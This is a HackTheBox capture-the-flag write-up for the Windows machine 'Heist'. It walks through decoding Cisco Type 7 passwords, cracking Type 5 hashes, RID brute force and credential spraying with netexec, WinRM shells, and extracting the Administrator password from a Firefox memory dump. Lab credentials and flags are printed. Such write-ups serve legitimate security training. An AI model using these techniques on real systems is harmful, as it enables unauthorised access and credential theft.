# HTB — Heist

![Platform](https://img.shields.io/badge/Platform-HackTheBox-9FEF00?style=flat-square&logo=hackthebox&logoColor=black)
![OS](https://img.shields.io/badge/OS-Windows-0078D6?style=flat-square&logo=windows&logoColor=white)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=flat-square)
![Status](https://img.shields.io/badge/Status-Rooted-success?style=flat-square)
![Techniques](https://img.shields.io/badge/Techniques-Cisco%20Cracking%20%7C%20RID%20Brute%20%7C%20Firefox%20Memory%20Dump-blueviolet?style=flat-square)

---

## Summary

Heist is a Windows machine that chains Cisco password cracking, credential spraying, and Firefox process memory dumping to achieve full Administrator access. A support ticket on the web app contains a Cisco router configuration with Type 5 and Type 7 password hashes. Decoding and cracking these yields three passwords which are sprayed against discovered Windows users. One combination grants WinRM access as Chase. Firefox is running on the machine as a privileged user and its process memory contains the Administrator password in plaintext from a cached login session.

---

## Machine Info

| Field | Details |
|---|---|
| IP | 10.129.20.127 |
| Hostname | SUPPORTDESK |
| Domain | SupportDesk |
| OS | Windows 10 / Server 2019 |
| User Flag | `ee9b43457a118ace75a8c905e7d50f55` |
| Root Flag | `4ef42665db67b4fe686637652ff18d47` |

---

## Attack Path Overview

```
Port 80 — Support Login Page
     |
     | Guest access — Cisco router config in ticket
     v
Type 7 decode (instant) + Type 5 hashcat crack
     |
     | hazard:stealth1agent valid on web app
     v
netexec --rid-brute → full user list
     |
     | Credential spray → Chase:Q4)sJu\Y8qz*A3?d
     v
evil-winrm shell + user flag
     |
     | Get-Process → Firefox running as privileged user
     v
procdump -ma → Select-String → login_password=4dD!5}x/re8]FBuZ
     |
     | administrator:4dD!5}x/re8]FBuZ
     v
evil-winrm as Administrator + root flag
```

---

## Enumeration

### Port Scanning

**Phase A — Wide coverage:**
```bash
nmap -p- --min-rate 1000 -oN heist-all-ports.txt 10.129.20.127
```

**Extract ports for Phase B:**
```bash
ports=$(grep open heist-all-ports.txt | cut -d '/' -f1 | tr '\n' ',' | sed 's/,$//')
```

**Phase B — Deep identification:**
```bash
nmap -p $ports -sC -sV --min-rate 1000 -oN heist-service-scan.txt 10.129.20.127
```

**Key findings:**

| Port | Service | Significance |
|---|---|---|
| 80 | HTTP IIS | Support login page — entry point |
| 135 | RPC | Standard Windows RPC |
| 445 | SMB | Signing not required — relay possible |
| 5985 | WinRM | Shell delivery once creds obtained |

No domain name returned by nmap. Confirm hostname via netexec:

```bash
netexec smb 10.129.20.127
```

Result: `name: SUPPORTDESK`, `domain: SupportDesk`, SMB signing False.

```bash
echo "10.129.20.127 supportdesk.htb SupportDesk" | sudo tee -a /etc/hosts
```

### Web App Enumeration

Browse to `http://10.129.20.127`. A support portal with guest access. A ticket from user `hazard` contains a Cisco router configuration with three password entries.

---

## Foothold

### Cisco Password Recovery

**Type 7 passwords use a reversible XOR cipher:**
```python
python3 -c "
def cisco7(enc):
    xlat = 'dsfd;kfoA,.iyewrkldJKDHSUBsgvca69834ncxv9873254k;fg87'
    dec = ''
    enc = bytes.fromhex(enc)
    for i, b in enumerate(enc[1:]):
        dec += chr(b ^ ord(xlat[(int(enc[0]) + i) % 53]))
    return dec

print('rout3r:', cisco7('0242114B0E143F015F5D1E161713'))
print('admin:', cisco7('02375012182C1A1D751618034F36415408'))
"
```

Results: `rout3r:$uperP@ssword` and `admin:Q4)sJu\Y8qz*A3?d`

**Type 5 is MD5crypt — crack with hashcat mode 500:**
```bash
hashcat -m 500 '$1$pdQG$o8nrSzsGXeaduXrjlvKc91' /usr/share/wordlists/rockyou.txt --force
```

Result: `stealth1agent`

### User Enumeration via RID Brute Force

`hazard:stealth1agent` is valid on the web app, confirming it as a Windows account. Use it to enumerate all users:

```bash
netexec smb 10.129.20.127 -u hazard -p 'stealth1agent' --rid-brute
```

Users discovered: Administrator, Hazard, support, Chase, Jason.

### Credential Spray

```bash
netexec winrm 10.129.20.127 -u users.txt -p passwords.txt
```

Hit: `Chase:Q4)sJu\Y8qz*A3?d` — `(Pwn3d!)`

### WinRM Shell

```bash
evil-winrm -i 10.129.20.127 -u Chase -p 'Q4)sJu\Y8qz*A3?d'
```

```powershell
type C:\Users\Chase\Desktop\user.txt
```

**User flag:** `ee9b43457a118ace75a8c905e7d50f55`

---

## Privilege Escalation

### Process Enumeration

```powershell
Get-Process
```

Multiple Firefox processes running. The largest (PID 6492, 142MB working set) suggests an active browser session running as a privileged user.

### Firefox Process Memory Dump

Upload procdump from Sysinternals:

```bash
wget https://live.sysinternals.com/procdump.exe -O procdump.exe
```

In evil-winrm:
```powershell
upload procdump.exe
.\procdump.exe -ma 6492 -accepteula
```

Search the dump:
```powershell
Select-String -Path *.dmp -Pattern "password" -Encoding ascii
```

Finding in dump output:
```
localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ
```

### Administrator Shell

```bash
netexec winrm 10.129.20.127 -u administrator -p '4dD!5}x/re8]FBuZ'
```

`(Pwn3d!)` confirmed.

```bash
evil-winrm -i 10.129.20.127 -u administrator -p '4dD!5}x/re8]FBuZ'
```

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

**Root flag:** `4ef42665db67b4fe686637652ff18d47`

---

## Vulnerabilities

| Vulnerability | Location | Impact |
|---|---|---|
| Cisco config exposed in support ticket | Web app ticket attachment | Three credential sets recovered |
| Weak Cisco Type 5 password | enable secret | Cracked in under 3 minutes |
| Cisco Type 7 encoding is reversible | username password fields | Instant decode |
| Credential reuse across Cisco and Windows | Chase account | WinRM access |
| Firefox running as privileged user | Process list | Admin credentials in memory |
| Plaintext credentials in process memory | Firefox PID 6492 | Administrator account compromise |

---

## Tools

| Tool | Purpose |
|---|---|
| nmap | Port and service scanning |
| netexec | Hostname discovery, RID brute force, credential spray |
| Python3 | Cisco Type 7 XOR decode |
| hashcat | Cisco Type 5 MD5crypt crack |
| evil-winrm | WinRM shell |
| procdump | Full Firefox process memory dump |
| Select-String | Credential search in memory dump |

---

## Key Takeaways

1. When nmap returns no domain name, use `netexec smb` immediately to pull the hostname, domain, OS, and SMB signing status.
2. Cisco Type 7 passwords are reversible, not encrypted. Decode them instantly with a Python XOR function.
3. Cisco Type 5 passwords are MD5crypt hashes identified by the `$1$` prefix. Hashcat mode 500 cracks them.
4. RID brute forcing with low-privilege SMB access reveals every account on the machine without admin rights.
5. Running processes are enumeration targets. A browser running as a privileged user means credentials may be cached in its process memory.
6. Firefox process memory dumps frequently contain URL-encoded form submission data including plaintext passwords from recent logins.

---

## References

- [Cisco Type 7 Password Decryption](https://www.ifm.net.nz/cookbooks/passwordcracker.html)
- [Procdump Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump)
- [netexec RID Brute Force](https://www.netexec.wiki)

---

*by mavhezha | github.com/mavhezha | mavhezha.com*
